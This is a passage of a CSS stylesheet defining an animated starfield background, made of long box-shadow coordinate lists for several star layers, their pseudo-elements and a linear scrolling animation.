1849px 1119px #FFF , 1840px 231px #FFF , 400px 1747px #FFF , 1404px 1492px #FFF , 1202px 155px #FFF , 1099px 1477px #FFF , 825px 1989px #FFF , 264px 1801px #FFF , 826px 817px #FFF , 572px 1921px #FFF , 756px 670px #FFF , 1217px 1540px #FFF , 1394px 495px #FFF , 1033px 1229px #FFF , 700px 920px #FFF , 1843px 1138px #FFF , 938px 1700px #FFF , 1721px 1310px #FFF , 449px 1259px #FFF , 249px 472px #FFF , 1518px 1387px #FFF , 25px 1395px #FFF , 1180px 241px #FFF , 645px 1598px #FFF , 1506px 973px #FFF , 468px 1112px #FFF , 1760px 1913px #FFF , 142px 914px #FFF , 1868px 81px #FFF , 460px 405px #FFF , 12px 1932px #FFF , 1601px 1872px #FFF , 1063px 587px #FFF , 1757px 1982px #FFF , 542px 1341px #FFF , 1980px 100px #FFF , 210px 786px #FFF , 101px 793px #FFF , 16px 1556px #FFF , 1628px 1538px #FFF , 1897px 70px #FFF , 1308px 68px #FFF , 1850px 1269px #FFF , 307px 704px #FFF , 1812px 1113px #FFF , 410px 912px #FFF , 126px 549px #FFF , 1373px 422px #FFF , 1371px 1189px #FFF , 935px 1355px #FFF , 1508px 631px #FFF , 418px 1168px #FFF , 295px 1288px #FFF , 188px 512px #FFF , 1906px 777px #FFF , 1998px 835px #FFF , 1310px 1128px #FFF , 702px 1259px #FFF , 1959px 220px #FFF , 718px 17px #FFF , 85px 403px #FFF , 1848px 1575px #FFF , 1961px 178px #FFF , 590px 1459px #FFF , 1198px 494px #FFF , 152px 1488px #FFF , 1195px 313px #FFF , 858px 708px #FFF , 1727px 944px #FFF , 1565px 720px #FFF , 697px 609px #FFF , 1001px 1305px #FFF , 1589px 200px #FFF , 1131px 1453px #FFF , 1920px 356px #FFF , 1636px 1593px #FFF , 243px 1651px #FFF , 1661px 989px #FFF , 1705px 292px #FFF , 95px 1790px #FFF , 1751px 1848px #FFF , 1411px 1768px #FFF , 110px 88px #FFF , 1528px 1645px #FFF , 1354px 912px #FFF , 1029px 913px #FFF , 1705px 782px #FFF , 1355px 574px #FFF , 919px 1248px #FFF , 1317px 618px #FFF , 1179px 921px #FFF , 434px 159px #FFF , 1669px 621px #FFF , 159px 619px #FFF , 456px 1567px #FFF , 862px 1925px #FFF , 836px 305px #FFF , 413px 1051px #FFF , 1226px 1404px #FFF , 1953px 1256px #FFF , 1342px 1926px #FFF , 427px 301px #FFF , 451px 830px #FFF , 7px 1071px #FFF , 626px 1084px #FFF , 1425px 9px #FFF , 106px 1681px #FFF , 280px 354px #FFF , 125px 833px #FFF , 1271px 275px #FFF , 1400px 1793px #FFF , 689px 1899px #FFF , 1554px 919px #FFF , 547px 232px #FFF , 588px 1672px #FFF , 1057px 739px #FFF , 1048px 357px #FFF , 393px 702px #FFF , 414px 1232px #FFF , 464px 1891px #FFF , 1866px 1934px #FFF , 564px 990px #FFF , 866px 953px #FFF , 1277px 1928px #FFF , 1680px 1596px #FFF , 745px 603px #FFF , 1654px 1625px #FFF , 32px 1250px #FFF , 710px 839px #FFF , 1996px 1870px #FFF , 1799px 203px #FFF , 111px 772px #FFF , 1078px 2px #FFF , 1178px 1290px #FFF , 1961px 166px #FFF , 972px 694px #FFF , 680px 339px #FFF , 721px 988px #FFF , 1390px 1726px #FFF , 239px 598px #FFF , 1665px 638px #FFF , 280px 487px #FFF , 41px 39px #FFF , 904px 1149px #FFF , 537px 1699px #FFF , 1714px 847px #FFF , 1719px 1145px #FFF , 1669px 336px #FFF , 1742px 1667px #FFF , 1380px 509px #FFF , 1109px 177px #FFF , 837px 1835px #FFF , 1059px 1769px #FFF , 115px 1387px #FFF , 1910px 1036px #FFF , 814px 1452px #FFF , 1817px 478px #FFF , 1573px 554px #FFF , 443px 1953px #FFF , 1469px 909px #FFF , 1412px 1059px #FFF , 856px 1230px #FFF , 1935px 1205px #FFF , 449px 437px #FFF , 68px 1541px #FFF , 255px 501px #FFF , 915px 936px #FFF , 985px 354px #FFF , 1575px 1651px #FFF , 547px 441px #FFF , 1572px 1725px #FFF , 1322px 1070px #FFF , 116px 1682px #FFF , 1492px 1087px #FFF , 1846px 160px #FFF , 1141px 1739px #FFF , 178px 1177px #FFF , 548px 939px #FFF , 86px 1194px #FFF , 1815px 824px #FFF , 597px 1268px #FFF , 772px 784px #FFF , 136px 1897px #FFF , 226px 460px #FFF , 368px 1376px #FFF , 1174px 816px #FFF , 1902px 461px #FFF , 1306px 961px #FFF , 1057px 87px #FFF , 1705px 1034px #FFF , 1110px 1777px #FFF , 988px 1192px #FFF , 1260px 6px #FFF , 552px 814px #FFF , 386px 1543px #FFF , 698px 1002px #FFF , 1398px 240px #FFF , 1350px 102px #FFF , 1897px 918px #FFF , 1514px 1609px #FFF , 1396px 452px #FFF , 1986px 1440px #FFF , 1432px 1467px #FFF , 321px 1643px #FFF , 1294px 426px #FFF , 1133px 99px #FFF , 238px 1519px #FFF , 1109px 365px #FFF , 1072px 718px #FFF , 1581px 1971px #FFF , 1525px 1614px #FFF , 824px 1730px #FFF , 757px 1353px #FFF , 1369px 208px #FFF , 360px 1139px #FFF , 1481px 853px #FFF , 272px 363px #FFF , 1722px 52px #FFF , 458px 1144px #FFF , 410px 480px #FFF , 911px 1703px #FFF , 348px 1945px #FFF , 375px 193px #FFF , 1514px 1142px #FFF , 435px 1033px #FFF , 1825px 1125px #FFF , 647px 1362px #FFF , 1437px 697px #FFF , 817px 987px #FFF , 178px 1133px #FFF , 755px 1368px #FFF , 357px 1931px #FFF , 1879px 1841px #FFF , 823px 287px #FFF , 1201px 1198px #FFF , 126px 1193px #FFF , 1093px 1719px #FFF , 115px 383px #FFF , 1434px 531px #FFF , 1503px 1562px #FFF , 512px 875px #FFF , 848px 1593px #FFF , 69px 44px #FFF , 276px 1237px #FFF , 436px 593px #FFF , 134px 1148px #FFF , 1650px 87px #FFF , 75px 1323px #FFF , 1828px 1936px #FFF , 164px 56px #FFF , 1794px 751px #FFF , 1594px 283px #FFF , 938px 20px #FFF , 479px 1644px #FFF , 1370px 1895px #FFF , 1066px 1424px #FFF , 571px 648px #FFF , 780px 1203px #FFF , 821px 131px #FFF , 929px 1219px #FFF , 1708px 1909px #FFF , 1019px 1349px #FFF , 97px 419px #FFF , 985px 1228px #FFF , 1255px 1904px #FFF , 1156px 166px #FFF , 1499px 1705px #FFF , 679px 255px #FFF , 1242px 808px #FFF , 619px 843px #FFF , 16px 1436px #FFF , 1460px 109px #FFF , 648px 224px #FFF , 133px 137px #FFF , 977px 94px #FFF , 1942px 1706px #FFF , 355px 1075px #FFF , 622px 1440px #FFF , 433px 1695px #FFF , 224px 1044px #FFF , 1878px 1271px #FFF , 901px 531px #FFF , 598px 1542px #FFF , 1707px 156px #FFF , 1733px 1351px #FFF , 503px 247px #FFF , 1614px 1988px #FFF , 289px 34px #FFF , 10px 808px #FFF , 1250px 245px #FFF , 253px 1604px #FFF , 1107px 1763px #FFF , 781px 362px #FFF , 433px 714px #FFF , 1507px 1341px #FFF , 1673px 1050px #FFF , 657px 1761px #FFF , 82px 88px #FFF , 1894px 1756px #FFF , 1325px 1880px #FFF , 1396px 1338px #FFF , 2px 1667px #FFF , 545px 189px #FFF , 1693px 267px #FFF , 497px 6px #FFF , 1857px 673px #FFF , 1926px 524px #FFF , 1565px 1886px #FFF , 239px 1803px #FFF , 290px 134px #FFF , 1374px 1294px #FFF , 1602px 440px #FFF , 1809px 1176px #FFF , 522px 978px #FFF , 964px 1669px #FFF , 592px 247px #FFF , 1865px 180px #FFF , 1751px 1205px #FFF , 1037px 1985px #FFF , 506px 444px #FFF , 1181px 1113px #FFF , 1388px 89px #FFF , 450px 1309px #FFF , 1773px 1944px #FFF , 390px 403px #FFF , 1425px 711px #FFF , 834px 372px #FFF , 1423px 233px #FFF , 241px 187px #FFF , 656px 1152px #FFF , 1427px 1982px #FFF , 261px 873px #FFF , 1190px 109px #FFF , 933px 242px #FFF , 1634px 376px #FFF , 1809px 1450px #FFF , 507px 1424px #FFF , 1277px 291px #FFF , 662px 1379px #FFF , 574px 1789px #FFF , 758px 1237px #FFF , 709px 1502px #FFF , 393px 791px #FFF , 1648px 1999px #FFF , 202px 672px #FFF , 215px 1257px #FFF , 1176px 1583px #FFF , 1706px 209px #FFF , 26px 73px #FFF , 778px 1782px #FFF , 1078px 769px #FFF , 1186px 1947px #FFF , 1690px 1636px #FFF , 1440px 104px #FFF , 1115px 576px #FFF , 642px 159px #FFF , 1432px 520px #FFF , 427px 1495px #FFF , 1831px 1051px #FFF , 1409px 136px #FFF , 85px 107px #FFF , 27px 1064px #FFF , 1057px 1250px #FFF , 1999px 243px #FFF , 627px 401px #FFF , 764px 1468px #FFF , 968px 1367px #FFF , 1781px 1089px #FFF , 1614px 1683px #FFF , 408px 962px #FFF , 1510px 748px #FFF , 385px 893px #FFF , 961px 1005px #FFF , 1987px 1824px #FFF , 1229px 1307px #FFF , 364px 142px #FFF , 1056px 774px #FFF , 1620px 504px #FFF , 235px 1732px #FFF , 1695px 875px #FFF , 334px 798px #FFF , 133px 1772px #FFF , 924px 1906px #FFF , 451px 1905px #FFF , 1039px 1645px #FFF , 133px 170px #FFF , 1359px 385px #FFF , 1681px 1516px #FFF , 1353px 1991px #FFF , 422px 435px #FFF , 357px 926px #FFF , 1684px 562px #FFF , 191px 76px #FFF , 306px 1729px #FFF , 687px 366px #FFF , 1810px 1757px #FFF , 861px 1143px #FFF , 1045px 323px #FFF , 1085px 1434px #FFF , 540px 1043px #FFF , 201px 214px #FFF , 1442px 311px #FFF , 397px 641px #FFF , 1708px 618px #FFF , 1580px 19px #FFF , 1668px 1111px #FFF , 698px 153px #FFF , 1603px 1788px #FFF , 716px 1657px #FFF , 587px 845px #FFF , 1026px 864px #FFF , 1885px 1012px #FFF , 425px 1852px #FFF , 679px 776px #FFF , 1914px 690px #FFF , 1021px 1373px #FFF , 1317px 1631px #FFF , 1558px 780px #FFF , 352px 1545px #FFF , 1033px 1797px #FFF , 1806px 1207px #FFF , 1513px 517px #FFF , 786px 517px #FFF , 19px 1684px #FFF , 308px 1468px #FFF , 1513px 527px #FFF , 259px 1104px #FFF , 1457px 1396px #FFF , 1350px 451px #FFF , 283px 271px #FFF , 456px 542px #FFF , 1013px 1894px #FFF , 1985px 580px #FFF , 1523px 105px #FFF , 1293px 230px #FFF , 1902px 89px #FFF , 841px 802px #FFF , 1247px 1258px #FFF , 1412px 497px #FFF , 1215px 1753px #FFF , 697px 419px #FFF , 348px 1915px #FFF , 269px 263px #FFF , 193px 951px #FFF , 1942px 797px #FFF , 1908px 1031px #FFF , 901px 1387px #FFF , 556px 1172px #FFF , 314px 240px #FFF , 412px 1525px #FFF , 1417px 1322px #FFF , 1459px 79px #FFF , 1221px 756px #FFF , 1114px 1525px #FFF , 797px 353px #FFF , 1786px 919px #FFF , 521px 1331px #FFF , 1553px 1278px #FFF , 230px 739px #FFF , 1497px 1213px #FFF , 816px 965px #FFF , 1996px 967px #FFF , 972px 473px #FFF , 424px 1660px #FFF , 1864px 1728px #FFF , 1384px 472px #FFF , 746px 1733px #FFF , 1963px 1056px #FFF , 1968px 650px #FFF , 1750px 789px #FFF , 828px 282px #FFF , 661px 999px #FFF , 375px 1822px #FFF , 1929px 1943px #FFF , 132px 1221px #FFF , 1282px 27px #FFF , 463px 806px #FFF , 420px 68px #FFF , 1071px 738px #FFF , 724px 739px #FFF , 781px 1195px #FFF , 1743px 541px #FFF , 1196px 49px #FFF , 1463px 640px #FFF , 1634px 566px #FFF , 950px 1678px #FFF , 1654px 1650px #FFF , 1941px 1232px #FFF , 1627px 543px #FFF , 148px 595px #FFF , 1472px 1487px #FFF , 1433px 1907px #FFF , 460px 694px #FFF , 672px 426px #FFF , 1737px 1347px #FFF , 605px 1940px #FFF , 434px 1732px #FFF , 399px 1787px #FFF , 1332px 285px #FFF , 1900px 929px #FFF , 1445px 963px #FFF , 1558px 821px #FFF , 1947px 348px #FFF , 1645px 1512px #FFF , 393px 1600px #FFF , 1006px 1282px #FFF , 1501px 1040px #FFF , 42px 1454px #FFF , 1865px 514px #FFF , 1621px 1746px #FFF , 288px 465px #FFF , 1718px 449px #FFF , 913px 1558px #FFF , 1549px 34px #FFF , 1728px 164px #FFF , 634px 1952px #FFF , 1858px 1992px #FFF , 765px 606px #FFF , 1487px 1432px #FFF , 1600px 341px #FFF , 1939px 759px #FFF , 1054px 622px #FFF , 241px 806px #FFF , 935px 107px #FFF , 1305px 179px #FFF , 540px 1573px #FFF , 367px 1950px #FFF , 759px 1130px #FFF , 393px 1444px #FFF , 984px 209px #FFF , 1622px 449px #FFF , 606px 1638px #FFF , 1846px 1125px #FFF , 498px 408px #FFF , 1795px 742px #FFF , 5px 1341px #FFF , 1402px 1634px #FFF , 707px 397px #FFF , 1372px 194px #FFF , 1945px 113px #FFF , 1097px 695px #FFF , 909px 479px #FFF , 1396px 349px #FFF , 1585px 1464px #FFF , 285px 665px #FFF , 1196px 1436px #FFF , 710px 807px #FFF , 1703px 1185px #FFF , 591px 637px #FFF , 1701px 1348px #FFF , 1922px 48px #FFF , 308px 1724px #FFF , 620px 1818px #FFF , 605px 1276px #FFF , 1972px 971px #FFF , 1703px 1828px #FFF , 724px 1416px #FFF , 1502px 1797px #FFF , 563px 613px #FFF , 1989px 19px #FFF , 1227px 1693px #FFF , 365px 1882px #FFF , 1977px 827px #FFF , 200px 724px #FFF , 1066px 533px #FFF , 1470px 1566px #FFF , 1695px 586px #FFF , 1423px 875px #FFF , 33px 832px #FFF , 607px 248px #FFF , 243px 1836px #FFF , 1622px 418px #FFF , 145px 689px #FFF , 1770px 1453px #FFF , 19px 196px #FFF , 752px 1909px #FFF , 401px 250px #FFF , 837px 941px #FFF , 1636px 327px #FFF , 83px 1953px #FFF , 151px 1684px #FFF , 780px 168px #FFF , 170px 1449px #FFF , 497px 1044px #FFF , 417px 1017px #FFF , 1047px 951px #FFF , 156px 834px #FFF , 1624px 725px #FFF , 750px 1945px #FFF , 1943px 406px #FFF , 1267px 592px #FFF , 1019px 487px #FFF , 216px 145px #FFF , 883px 1687px #FFF , 917px 694px #FFF , 804px 909px #FFF , 283px 1254px #FFF , 46px 1697px #FFF , 1616px 1177px #FFF , 871px 1466px #FFF , 1938px 906px #FFF , 1588px 1223px #FFF , 1094px 1461px #FFF , 1709px 1450px #FFF , 1194px 374px #FFF , 34px 1957px #FFF , 47px 878px #FFF , 591px 175px #FFF , 376px 1712px #FFF , 1163px 1635px #FFF , 869px 709px #FFF , 224px 314px #FFF , 1301px 194px #FFF , 628px 1329px #FFF , 784px 1699px #FFF , 1376px 180px #FFF , 1607px 1077px #FFF , 312px 714px #FFF , 913px 1772px #FFF , 422px 1645px #FFF , 1809px 1507px #FFF , 983px 109px #FFF , 50px 1703px #FFF , 1102px 1182px #FFF , 136px 1037px #FFF , 251px 1376px #FFF , 1283px 299px #FFF , 1540px 713px #FFF , 756px 1345px #FFF , 1012px 980px #FFF , 1785px 756px #FFF , 429px 439px #FFF , 1571px 763px #FFF , 390px 1160px #FFF , 1757px 1670px #FFF , 1592px 1877px #FFF , 1118px 728px #FFF , 690px 558px #FFF , 1705px 873px #FFF , 1355px 1029px #FFF , 494px 1008px #FFF , 785px 1415px #FFF , 1647px 1447px #FFF , 1392px 967px #FFF , 294px 1217px #FFF , 603px 1221px #FFF , 614px 1699px #FFF , 1056px 9px #FFF , 610px 1940px #FFF;
}

#stars2 {
  width: 2px;
  height: 2px;
  background: transparent;
  box-shadow: 1846px 879px #FFF , 793px 1777px #FFF , 1550px 1302px #FFF , 1317px 963px #FFF , 338px 466px #FFF , 1795px 164px #FFF , 1625px 1409px #FFF , 750px 1314px #FFF , 1204px 1171px #FFF , 841px 1314px #FFF , 1608px 1368px #FFF , 1083px 1213px #FFF , 1657px 1620px #FFF , 341px 1560px #FFF , 249px 1200px #FFF , 726px 1440px #FFF , 1739px 1495px #FFF , 1366px 311px #FFF , 149px 1520px #FFF , 785px 1010px #FFF , 965px 54px #FFF , 1209px 1171px #FFF , 1152px 1115px #FFF , 270px 62px #FFF , 1280px 459px #FFF , 39px 1430px #FFF , 1887px 1360px #FFF , 1808px 1684px #FFF , 1577px 1832px #FFF , 44px 1778px #FFF , 1662px 1147px #FFF , 560px 1907px #FFF , 1875px 237px #FFF , 696px 1934px #FFF , 674px 1956px #FFF , 849px 1168px #FFF , 161px 1758px #FFF , 918px 762px #FFF , 1868px 1708px #FFF , 1008px 1436px #FFF , 1545px 1005px #FFF , 625px 982px #FFF , 350px 706px #FFF , 1766px 1929px #FFF , 835px 1057px #FFF , 1128px 53px #FFF , 1761px 1030px #FFF , 1381px 1910px #FFF , 1653px 1700px #FFF , 1px 591px #FFF , 1764px 941px #FFF , 1600px 737px #FFF , 1469px 644px #FFF , 1808px 1585px #FFF , 1083px 270px #FFF , 858px 1832px #FFF , 124px 832px #FFF , 146px 54px #FFF , 535px 988px #FFF , 891px 159px #FFF , 821px 679px #FFF , 1854px 1044px #FFF , 363px 412px #FFF , 811px 732px #FFF , 1923px 828px #FFF , 1330px 1108px #FFF , 588px 1359px #FFF , 1557px 489px #FFF , 1423px 795px #FFF , 763px 5px #FFF , 1802px 1630px #FFF , 63px 1727px #FFF , 787px 747px #FFF , 239px 1156px #FFF , 1425px 1868px #FFF , 1176px 378px #FFF , 761px 1220px #FFF , 1924px 875px #FFF , 1973px 1479px #FFF , 1268px 1559px #FFF , 472px 307px #FFF , 52px 967px #FFF , 691px 1904px #FFF , 1383px 920px #FFF , 1627px 1694px #FFF , 1697px 756px #FFF , 875px 647px #FFF , 570px 1496px #FFF , 1886px 1197px #FFF , 304px 1018px #FFF , 523px 705px #FFF , 1304px 594px #FFF , 1027px 248px #FFF , 1873px 1120px #FFF , 435px 1599px #FFF , 1132px 1187px #FFF , 1988px 1606px #FFF , 1574px 1350px #FFF , 495px 70px #FFF , 1787px 214px #FFF , 549px 1912px #FFF , 63px 1869px #FFF , 105px 1735px #FFF , 321px 844px #FFF , 1987px 1606px #FFF , 305px 1963px #FFF , 675px 1502px #FFF , 445px 1343px #FFF , 1973px 1884px #FFF , 1785px 299px #FFF , 1532px 1089px #FFF , 1343px 1778px #FFF , 47px 1478px #FFF , 1627px 1184px #FFF , 340px 761px #FFF , 171px 981px #FFF , 1534px 1356px #FFF , 1097px 1944px #FFF , 972px 1266px #FFF , 165px 373px #FFF , 492px 1854px #FFF , 1004px 1848px #FFF , 157px 99px #FFF , 590px 244px #FFF , 1885px 159px #FFF , 1706px 1700px #FFF , 1311px 56px #FFF , 865px 793px #FFF , 409px 493px #FFF , 1812px 329px #FFF , 653px 762px #FFF , 557px 400px #FFF , 1048px 620px #FFF , 944px 344px #FFF , 1618px 861px #FFF , 914px 1360px #FFF , 1342px 1362px #FFF , 508px 1836px #FFF , 1590px 1581px #FFF , 682px 1235px #FFF , 1713px 1205px #FFF , 36px 122px #FFF , 1629px 1966px #FFF , 1239px 543px #FFF , 1350px 621px #FFF , 1553px 994px #FFF , 1661px 1841px #FFF , 544px 969px #FFF , 735px 211px #FFF , 1207px 1256px #FFF , 580px 37px #FFF , 409px 1563px #FFF , 498px 938px #FFF , 271px 1547px #FFF , 504px 1861px #FFF , 482px 197px #FFF , 1860px 802px #FFF , 406px 945px #FFF , 144px 1015px #FFF , 1683px 1004px #FFF , 970px 1066px #FFF , 1587px 1813px #FFF , 608px 1260px #FFF , 1057px 756px #FFF , 554px 1071px #FFF , 1535px 11px #FFF , 1554px 1997px #FFF , 1618px 1659px #FFF , 812px 28px #FFF , 1164px 502px #FFF , 1255px 899px #FFF , 95px 1911px #FFF , 1086px 301px #FFF , 428px 1291px #FFF , 1463px 1599px #FFF , 544px 1407px #FFF , 527px 898px #FFF , 727px 1277px #FFF , 269px 1391px #FFF , 642px 321px #FFF , 1122px 1251px #FFF , 355px 990px #FFF , 448px 1213px #FFF , 775px 1868px #FFF , 422px 899px #FFF , 902px 966px #FFF , 1019px 1672px #FFF , 597px 1589px #FFF , 1957px 1863px #FFF , 1381px 1608px #FFF , 913px 890px #FFF , 789px 1937px #FFF , 674px 107px #FFF , 1687px 1305px #FFF , 1025px 1565px #FFF , 1398px 1080px #FFF , 1542px 966px #FFF , 1509px 1579px #FFF , 463px 1768px #FFF , 315px 678px #FFF;
  animation: animStar 100s linear infinite;
}
#stars2:after {
  content: " ";
  position: absolute;
  top: 200px;
  width: 2px;
  height: 2px;
  background: transparent;
  box-shadow: 1846px 879px #FFF , 793px 1777px #FFF , 1550px 1302px #FFF , 1317px 963px #FFF , 338px 466px #FFF , 1795px 164px #FFF , 1625px 1409px #FFF , 750px 1314px #FFF , 1204px 1171px #FFF , 841px 1314px #FFF , 1608px 1368px #FFF , 1083px 1213px #FFF , 1657px 1620px #FFF , 341px 1560px #FFF , 249px 1200px #FFF , 726px 1440px #FFF , 1739px 1495px #FFF , 1366px 311px #FFF , 149px 1520px #FFF , 785px 1010px #FFF , 965px 54px #FFF , 1209px 1171px #FFF , 1152px 1115px #FFF , 270px 62px #FFF , 1280px 459px #FFF , 39px 1430px #FFF , 1887px 1360px #FFF , 1808px 1684px #FFF , 1577px 1832px #FFF , 44px 1778px #FFF , 1662px 1147px #FFF , 560px 1907px #FFF , 1875px 237px #FFF , 696px 1934px #FFF , 674px 1956px #FFF , 849px 1168px #FFF , 161px 1758px #FFF , 918px 762px #FFF , 1868px 1708px #FFF , 1008px 1436px #FFF , 1545px 1005px #FFF , 625px 982px #FFF , 350px 706px #FFF , 1766px 1929px #FFF , 835px 1057px #FFF , 1128px 53px #FFF , 1761px 1030px #FFF , 1381px 1910px #FFF , 1653px 1700px #FFF , 1px 591px #FFF , 1764px 941px #FFF , 1600px 737px #FFF , 1469px 644px #FFF , 1808px 1585px #FFF , 1083px 270px #FFF , 858px 1832px #FFF , 124px 832px #FFF , 146px 54px #FFF , 535px 988px #FFF , 891px 159px #FFF , 821px 679px #FFF , 1854px 1044px #FFF , 363px 412px #FFF , 811px 732px #FFF , 1923px 828px #FFF , 1330px 1108px #FFF , 588px 1359px #FFF , 1557px 489px #FFF , 1423px 795px #FFF , 763px 5px #FFF , 1802px 1630px #FFF , 63px 1727px #FFF , 787px 747px #FFF , 239px 1156px #FFF , 1425px 1868px #FFF , 1176px 378px #FFF , 761px 1220px #FFF , 1924px 875px #FFF , 1973px 1479px #FFF , 1268px 1559px #FFF , 472px 307px #FFF , 52px 967px #FFF , 691px 1904px #FFF , 1383px 920px #FFF , 1627px 1694px #FFF , 1697px 756px #FFF , 875px 647px #FFF , 570px 1496px #FFF , 1886px 1197px #FFF , 304px 1018px #FFF , 523px 705px #FFF , 1304px 594px #FFF , 1027px 248px #FFF , 1873px 1120px #FFF , 435px 1599px #FFF , 1132px 1187px #FFF , 1988px 1606px #FFF , 1574px 1350px #FFF , 495px 70px #FFF , 1787px 214px #FFF , 549px 1912px #FFF , 63px 1869px #FFF , 105px 1735px #FFF , 321px 844px #FFF , 1987px 1606px #FFF , 305px 1963px #FFF , 675px 1502px #FFF , 445px 1343px #FFF , 1973px 1884px #FFF , 1785px 299px #FFF , 1532px 1089px #FFF , 1343px 1778px #FFF , 47px 1478px #FFF , 1627px 1184px #FFF , 340px 761px #FFF , 171px 981px #FFF , 1534px 1356px #FFF , 1097px 1944px #FFF , 972px 1266px #FFF , 165px 373px #FFF , 492px 1854px #FFF , 1004px 1848px #FFF , 157px 99px #FFF , 590px 244px #FFF , 1885px 159px #FFF , 1706px 1700px #FFF , 1311px 56px #FFF , 865px 793px #FFF , 409px 493px #FFF , 1812px 329px #FFF , 653px 762px #FFF , 557px 400px #FFF , 1048px 620px #FFF , 944px 344px #FFF , 1618px 861px #FFF , 914px 1360px #FFF , 1342px 1362px #FFF , 508px 1836px #FFF , 1590px 1581px #FFF , 682px 1235px #FFF , 1713px 1205px #FFF , 36px 122px #FFF , 1629px 1966px #FFF , 1239px 543px #FFF , 1350px 621px #FFF , 1553px 994px #FFF , 1661px 1841px #FFF , 544px 969px #FFF , 735px 211px #FFF , 1207px 1256px #FFF , 580px 37px #FFF , 409px 1563px #FFF , 498px 938px #FFF , 271px 1547px #FFF , 504px 1861px #FFF , 482px 197px #FFF , 1860px 802px #FFF , 406px 945px #FFF , 144px 1015px #FFF , 1683px 1004px #FFF , 970px 1066px #FFF , 1587px 1813px #FFF , 608px 1260px #FFF , 1057px 756px #FFF , 554px 1071px #FFF , 1535px 11px #FFF , 1554px 1997px #FFF , 1618px 1659px #FFF , 812px 28px #FFF , 1164px 502px #FFF , 1255px 899px #FFF , 95px 1911px #FFF , 1086px 301px #FFF , 428px 1291px #FFF , 1463px 1599px #FFF , 544px 1407px #FFF , 527px 898px #FFF , 727px 1277px #FFF , 269px 1391px #FFF , 642px 321px #FFF , 1122px 1251px #FFF , 355px 990px #FFF , 448px 1213px #FFF , 775px 1868px #FFF , 422px 899px #FFF , 902px 966px #FFF , 1019px 1672px #FFF , 597px 1589px #FFF , 1957px 1863px #FFF , 1381px 1608px #FFF , 913px 890px #FFF , 789px 1937px #FFF , 674px 107px #FFF , 1687px 1305px #FFF , 1025px 1565px #FFF , 1398px 1080px #FFF , 1542px 966px #FFF , 1509px 1579px #FFF , 463px 1768px #FFF , 315px 678px #FFF;
}

#stars3 {
  width: 3px;
  height: 3px;
  background: transparent;
  box-shadow: 52px 1860px #FFF , 1230px 1710px #FFF , 1529px 56px #FFF , 1050px 959px #FFF , 1269px 881px #FFF , 1917px 1032px #FFF , 740px 1417px #FFF , 1271px 1715px #FFF , 1811px 74px #FFF , 505px 1042px #FFF , 1687px 1750px #FFF , 1636px 813px #FFF , 1991px 1139px #FFF , 187px 616px #FFF , 575px 1967px #FFF , 865px 1634px #FFF , 204px 981px #FFF , 1710px 1927px #FFF , 59px 1505px #FFF , 1493px 399px #FFF , 763px 800px #FFF , 1813px 1881px #FFF , 1332px 376px #FFF , 300px 1286px #FFF , 1547px 502px #FFF , 1989px 1946px #FFF , 171px 1129px #FFF , 1311px 1085px #FFF , 1340px 1644px #FFF , 271px 216px #FFF , 1374px 1297px #FFF , 281px 1862px #FFF , 893px 779px #FFF , 520px 648px #FFF , 1211px 1373px #FFF , 1595px 1955px #FFF , 1385px 963px #FFF , 1157px 1430px #FFF , 364px 1276px #FFF , 399px 1915px #FFF , 1802px 1609px #FFF , 1089px 1612px #FFF , 1880px 557px #FFF , 731px 1876px #FFF , 316px 428px #FFF , 1592px 1906px #FFF , 642px 1019px #FFF , 1179px 1250px #FFF , 392px 356px #FFF , 1691px 1225px #FFF , 1100px 1177px #FFF , 1777px 203px #FFF , 674px 465px #FFF , 1308px 1814px #FFF , 291px 1062px #FFF , 1980px 1901px #FFF , 107px 200px #FFF , 347px 1897px #FFF , 1926px 1266px #FFF , 988px 1804px #FFF , 816px 599px #FFF , 1939px 252px #FFF , 815px 1904px #FFF , 1360px 1627px #FFF , 304px 1996px #FFF , 1986px 1519px #FFF , 1870px 1172px #FFF , 799px 620px #FFF , 1989px 1063px #FFF , 246px 714px #FFF , 760px 1148px #FFF , 1727px 1062px #FFF , 1690px 559px #FFF , 543px 1152px #FFF , 583px 1697px #FFF , 491px 811px #FFF , 701px 871px #FFF , 1230px 566px #FFF , 1027px 562px #FFF , 1788px 189px #FFF , 1809px 732px #FFF , 109px 1191px #FFF , 114px 1131px #FFF , 268px 1185px #FFF , 1470px 1821px #FFF , 326px 1543px #FFF , 504px 847px #FFF , 1569px 1735px #FFF , 670px 894px #FFF , 1745px 186px #FFF , 323px 526px #FFF , 41px 1310px #FFF , 782px 694px #FFF , 1021px 972px #FFF , 470px 1241px #FFF , 1512px 1044px #FFF , 1925px 1120px #FFF , 1753px 1059px #FFF , 268px 1732px #FFF , 1742px 1830px #FFF;
  animation: animStar 150s linear infinite;
}
#stars3:after {
  content: " ";
  position: absolute;
  top: 200px;
  width: 3px;
  height: 3px;
  background: transparent;
  box-shadow: 52px 1860px #FFF , 1230px 1710px #FFF , 1529px 56px #FFF , 1050px 959px #FFF , 1269px 881px #FFF , 1917px 1032px #FFF , 740px 1417px #FFF , 1271px 1715px #FFF , 1811px 74px #FFF , 505px 1042px #FFF , 1687px 1750px #FFF , 1636px 813px #FFF , 1991px 1139px #FFF , 187px 616px #FFF , 575px 1967px #FFF , 865px 1634px #FFF , 204px 981px #FFF , 1710px 1927px #FFF , 59px 1505px #FFF , 1493px 399px #FFF , 763px 800px #FFF , 1813px 1881px #FFF , 1332px 376px #FFF , 300px 1286px #FFF , 1547px 502px #FFF , 1989px 1946px #FFF , 171px 1129px #FFF , 1311px 1085px #FFF , 1340px 1644px #FFF , 271px 216px #FFF , 1374px 1297px #FFF , 281px 1862px #FFF , 893px 779px #FFF , 520px 648px #FFF , 1211px 1373px #FFF , 1595px 1955px #FFF , 1385px 963px #FFF , 1157px 1430px #FFF , 364px 1276px #FFF , 399px 1915px #FFF , 1802px 1609px #FFF , 1089px 1612px #FFF , 1880px 557px #FFF , 731px 1876px #FFF , 316px 428px #FFF , 1592px 1906px #FFF , 642px 1019px #FFF , 1179px 1250px #FFF , 392px 356px #FFF , 1691px 1225px #FFF , 1100px 1177px #FFF , 1777px 203px #FFF , 674px 465px #FFF , 1308px 1814px #FFF , 291px 1062px #FFF , 1980px 1901px #FFF , 107px 200px #FFF , 347px 1897px #FFF , 1926px 1266px #FFF , 988px 1804px #FFF , 816px 599px #FFF , 1939px 252px #FFF , 815px 1904px #FFF , 1360px 1627px #FFF , 304px 1996px #FFF , 1986px 1519px #FFF , 1870px 1172px #FFF , 799px 620px #FFF , 1989px 1063px #FFF , 246px 714px #FFF , 760px 1148px #FFF , 1727px 1062px #FFF , 1690px 559px #FFF , 543px 1152px #FFF , 583px 1697px #FFF , 491px 811px #FFF , 